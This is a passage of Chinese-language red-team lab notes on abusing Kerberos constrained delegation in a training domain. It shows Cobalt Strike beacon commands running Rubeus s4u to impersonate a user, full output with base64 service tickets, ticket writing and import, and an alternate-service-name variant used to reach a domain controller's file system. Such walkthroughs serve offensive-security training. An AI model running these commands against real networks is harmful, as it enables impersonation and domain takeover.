e0kvBA2DSCtQyBhMfdSAWHwDulpOMsZpj5SDouqosU5rYY3ffJ6v7dHEOZoep4OGI0AXGhU02cIiaDeTFCzvvlMHzGLRV7WLIR24GzciJoxRu3/k3GeylYgHZ2I+NpWjgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCDuzf+ZtnnNVrd9s1eEG3GhG87pMy3KdLrw3aRaEyYHjqETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBlNSVi0yJKMHAwUAQOEAAKURGA8yMDIyMDgxMzAwNDg1N1qmERgPMjAyMjA4MTMxMDQ4NTdapxEYDzIwMjIwODIwMDA0ODU3WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8= /nowrap
+```
+
+结果
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEJDCCBCBhggQcMIIEGKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA9IwggPOoAMCARKhAwIBAqKCA8AEggO8fOhVlAS/zEnZTsYjnXPdDMy0KpsClN+FYLxvzJf0Q5BTvFsP7s4ydsq8Irv90yGukYz+LkKueGx6wOlWPoXt0ukG/uVmhMjJMI96W92nQd2QRVoN2Fquzo7L8PU5MT0HkglN2ZwjYlUK2IkYQ++lShBEBZFiYM8lmvUSd3F/thF3b2DBPSRQ0LOkuiU0XydekDDdkycYneAjWnNpOtE6QkfWR/GTwis/Sz35tEZufcSM9UuXdd4GPy0eIkUpPXb08s88HXsRmTK17n3d738VIGKRjwV97FuR7R56S5N5CQvyfjpUbzf0nX3AgO7522Jv+Wz9DV1ruXpthXGf6iXHVkHunKptD7DTFwdrWkOGNIogOkDjqHF7Ejc4Rs0ozsZealvM52nC2EHuwQhQ2YrfbZXV46TXs+Vh4S+pBAUvVYoEuIGDBucUmfyAXHTyoXmZf8MTUAvKdYDm7NwSAv7ZcWe7R1b63/i9njxOQWhSQdVTi/FbtUZybTvnHYotp87Mraswuw0kL1/8Df/BI6QDkKiVosakW7om8y7gtihxHfPHVqxnn/qmtfbsPXBjpUcGC/hJVcwctQXNSd3uZHry0FrJ2uZszixg9isXSDiKNjs21u6EVl448MF1yig0yzhwVFZztzmzFR5e3AJF6DYAe82sjfFrLaveqcSWGMvQK3sZ7GwYnC9Mzv9TmOMAfuaHuolDfGEFluYn0b0G/3mVxirYJYwwD0jgrqCpf6qtJ/IbIRBRceNR4tkc3myptC52ip4jfb+O+TlgQtgkxerEu3RX+DQbzrGSz58QfEr3eqCtqXspcztpKZWQ+Z6ot4ae/0MgKRLicuiQX74boET6pXoJaqLjURJnwfy4p5gNAvx9PfexchfaQcmzelqShuLiiPSakVcWh7NwNzaLWszEr57QO74wdBASwRyHFrNHKUY4RGn6dFuQwxacUCgd0XxFnaUDRblE4gtlrGJ459/XQOPOCJnY501oGKnm6tEpAB8Bne3IQU0nBmfmXh1lKLJ9OD5OkiKZyzqP1KAO9vG919XS/EgaDpvBGD7GINergqn8wsWjyeUg+lAJXtJDmMIAIKbJZ1q1J//i6H8KE1x5cixFC3oUip7tj9h/4Rc1NecP6CH2/y7qaqIi+EKVe0kvBA2DSCtQyBhMfdSAWHwDulpOMsZpj5SDouqosU5rYY3ffJ6v7dHEOZoep4OGI0AXGhU02cIiaDeTFCzvvlMHzGLRV7WLIR24GzciJoxRu3/k3GeylYgHZ2I+NpWjgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCDuzf+ZtnnNVrd9s1eEG3GhG87pMy3KdLrw3aRaEyYHjqETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBlNSVi0yJKMHAwUAQOEAAKURGA8yMDIyMDgxMzAwNDg1N1qmERgPMjAyMjA4MTMxMDQ4NTdapxEYDzIwMjIwODIwMDA0ODU3WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8= /nowrap
+[*] Tasked beacon to run .NET program: Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEJDCCBCBhggQcMIIEGKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA9IwggPOoAMCARKhAwIBAqKCA8AEggO8fOhVlAS/zEnZTsYjnXPdDMy0KpsClN+FYLxvzJf0Q5BTvFsP7s4ydsq8Irv90yGukYz+LkKueGx6wOlWPoXt0ukG/uVmhMjJMI96W92nQd2QRVoN2Fquzo7L8PU5MT0HkglN2ZwjYlUK2IkYQ++lShBEBZFiYM8lmvUSd3F/thF3b2DBPSRQ0LOkuiU0XydekDDdkycYneAjWnNpOtE6QkfWR/GTwis/Sz35tEZufcSM9UuXdd4GPy0eIkUpPXb08s88HXsRmTK17n3d738VIGKRjwV97FuR7R56S5N5CQvyfjpUbzf0nX3AgO7522Jv+Wz9DV1ruXpthXGf6iXHVkHunKptD7DTFwdrWkOGNIogOkDjqHF7Ejc4Rs0ozsZealvM52nC2EHuwQhQ2YrfbZXV46TXs+Vh4S+pBAUvVYoEuIGDBucUmfyAXHTyoXmZf8MTUAvKdYDm7NwSAv7ZcWe7R1b63/i9njxOQWhSQdVTi/FbtUZybTvnHYotp87Mraswuw0kL1/8Df/BI6QDkKiVosakW7om8y7gtihxHfPHVqxnn/qmtfbsPXBjpUcGC/hJVcwctQXNSd3uZHry0FrJ2uZszixg9isXSDiKNjs21u6EVl448MF1yig0yzhwVFZztzmzFR5e3AJF6DYAe82sjfFrLaveqcSWGMvQK3sZ7GwYnC9Mzv9TmOMAfuaHuolDfGEFluYn0b0G/3mVxirYJYwwD0jgrqCpf6qtJ/IbIRBRceNR4tkc3myptC52ip4jfb+O+TlgQtgkxerEu3RX+DQbzrGSz58QfEr3eqCtqXspcztpKZWQ+Z6ot4ae/0MgKRLicuiQX74boET6pXoJaqLjURJnwfy4p5gNAvx9PfexchfaQcmzelqShuLiiPSakVcWh7NwNzaLWszEr57QO74wdBASwRyHFrNHKUY4RGn6dFuQwxacUCgd0XxFnaUDRblE4gtlrGJ459/XQOPOCJnY501oGKnm6tEpAB8Bne3IQU0nBmfmXh1lKLJ9OD5OkiKZyzqP1KAO9vG919XS/EgaDpvBGD7GINergqn8wsWjyeUg+lAJXtJDmMIAIKbJZ1q1J//i6H8KE1x5cixFC3oUip7tj9h/4Rc1NecP6CH2/y7qaqIi+EKVe0kvBA2DSCtQyBhMfdSAWHwDulpOMsZpj5SDouqosU5rYY3ffJ6v7dHEOZoep4OGI0AXGhU02cIiaDeTFCzvvlMHzGLRV7WLIR24GzciJoxRu3/k3GeylYgHZ2I+NpWjgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCDuzf+ZtnnNVrd9s1eEG3GhG87pMy3KdLrw3aRaEyYHjqETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBlNSVi0yJKMHAwUAQOEAAKURGA8yMDIyMDgxMzAwNDg1N1qmERgPMjAyMjA4MTMxMDQ4NTdapxEYDzIwMjIwODIwMDA0ODU3WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8= /nowrap
+[+] host called home, sent: 588995 bytes
+[+] received output:
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.1 
+
+[*] Action: S4U
+
+
+[+] received output:
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'SRV-2$@DEV.CYBERBOTIC.IO'
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
+[*] Sending S4U2self request to 10.10.17.71:88
+
+[+] received output:
+[+] S4U2self success!
+[*] Got a TGS for 'nlamb' to 'SRV-2$@DEV.CYBERBOTIC.IO'
+[*] base64(ticket.kirbi):
+
+      doIFfjCCBXqgAwIBBaEDAgEWooIEnTCCBJlhggSVMIIEkaADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPohMwEaADAgEBoQowCBsGU1JWLTIko4IEXjCCBFqgAwIBEqEDAgEFooIETASCBEgHGCOnWInEArG+7YvJ26rS6FGunQguMmhwBApldKvGNRh26/lRd9qc4CsSKau885i7cnVokLLt+lGLYDprkw/Jsyl1iMHdc+pgnSmYt7XV8dmg0zuNgeCGePDsC5UIqZAuUcdn3ihDRXj0wFxs0HpZjQ1P8MosTBfKkNwEjjBEGZ6lYBn6QL/jxJ18TykwDdNBfI+cwB3sTSyQLmyrximqnXKOo9YhiWkG2z91v9phfQEybJhgu1YyrvHLKKcy92nYzrMVPzG8yThoYo+BkslwYVZQZL2wtfeWJTPcdXlSdyRod3280B9dYzkPEJtzcIAAT52qB2ULaMlf4/jsZLiSujdM5xbCQT3jhbWBqHIvfryUWt/x64k8hzZUagMi61drn7XOD5no0F94tarpTMte5+aoVieWVMSU9wo+mbBx0slEnDN3783tlvO/Gt6ruyymdSqZaXiMkofmHuzhzGbLCCcWw0S95uRSmV7NIG0erPdiQhx0ZJQLnYN9w/gPFrYM0qLKPzFj2bR5yLJ5BrEfAmn3t0wCcs4q0FB3PpGUDZt+YxnO1+s/eK6y5+Quaz7YmT0ECLaI1tAtjFtVdNAk0knGBX/wrvV2dOEFVc+KtXhLDu/yBCM60+90C///3+ZSjKmIwYqAGvJwpwkkBo5suL8z08StMVJ1gC7YvTOdFy2rQe83lzb4uvw6UuvG3TdKFdPdT3a2yLcYoj1OtQqXxrqEmQBIhsvDFXhuDQGSIo2dG0TVCnHJA2ns2iBbayfAB1tKc06wE9+Xu/MD1i61QemJIoMvFwNWVDESrUSSKWXSZgN4Gc7js/xlqFKOLpxrzusncscU+wAjvq5UVF07dgRjedUUiit31J3BbU/ylhSZkGZUzTC+j759dXEUdK9AseYzjYB29UCfkVL975QzHuMcLLF0x7tdpLMVxt0+XI6Zt7Dav4Njp63//fkicWv5T81DQsksRr7UG1fUaBi2HQ9aIG8z75v7bys0+6wnIR2//I8i1QtITEOglidKU8yQFmPf6FZHMH/gGYVG5moS5mRQ79+KjXKtBm0JfiRFSfdB7PEFP+LDvA3mT4LpeqcICj5mhAb4ihioh++p1oetWtwui3ecTijX9eL/6v7AFmaCBXa8bmqrEabOOo0idx2mXJKg7qVHnlHIk6A/M+wkXiVuN6h5g42CIzoIpyycXMHJWa/PYeacunis1F0d0n1E5pWwNcblijrxWqAc/3Frh5f765/7DKBF4/kAA64d72aTcqnXtGr7w7Wwpx/ScKztiGWHTRuiMx51jxkbYsyEIHuN+QqTQZ+T8qv1x+kTchylyDpDrmHMFuIoC418w1opRa247QBCFrhgCDkjOLbp0vuLfkNnuPCCqmFzOQ/bt/bsP6vEWzFLUhWvJ0O1+Fcquu2BwkmWt6/SfQWGIrCFw9VC1JASC0ppQdS9zObDJrP67TDx7dkwo4HMMIHJoAMCAQCigcEEgb59gbswgbiggbUwgbIwga+gKzApoAMCARKhIgQgKndu2STtLSCZWSIzBez2fvFBHUB00VQy/4zIBLHzmY2hExsRREVWLkNZQkVSQk9USUMuSU+iEjAQoAMCAQqhCTAHGwVubGFtYqMHAwUAQCEAAKURGA8yMDIyMDgxMzAwNTMxNFqmERgPMjAyMjA4MTMxMDQ4NTdaqBMbEURFVi5DWUJFUkJPVElDLklPqRMwEaADAgEBoQowCBsGU1JWLTIk
+
+[*] Impersonating user 'nlamb' to target SPN 'cifs/wkstn-2.dev.cyberbotic.io'
+[*] Building S4U2proxy request for service: 'cifs/wkstn-2.dev.cyberbotic.io'
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
+[*] Sending S4U2proxy request to domain controller 10.10.17.71:88
+
+[+] received output:
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/wkstn-2.dev.cyberbotic.io':
+
+      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
+
+
+```
+
+
+1660352025272.png
+
+
+
+写票据
+
+```
+[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\cifs.kirbi" , [System.Convert]::FromBase64String( "doIGWDC....aWMuaW8="))
+```
+
+1660352469858.png
+
+导入票据
+
+1660352448322.png
+
+
+# Alternate Service Name
+
+申请tgs
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /ticket:doIFLDCC.....uSU8= /nowrap
+```
+
+根据上面生成的base64写tgs票据
+
+
+```
+[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\dc2-cifs.kirbi" , [System.Convert]::FromBase64String( "doIGUjCCBk6gAwIBBaEDAgE....MuaW8="))
+```
+
+
+1660354070932.png
+
+
+导入dc2-cifs.kirbi，访问dc2的文件系统
+```
+make_token DEV\nlamb FakePass
+
+kerberos_ticket_use C:\Users\Administrator\Desktop\dc2-cifs.kirbi
+```
+
+1660353939907.png
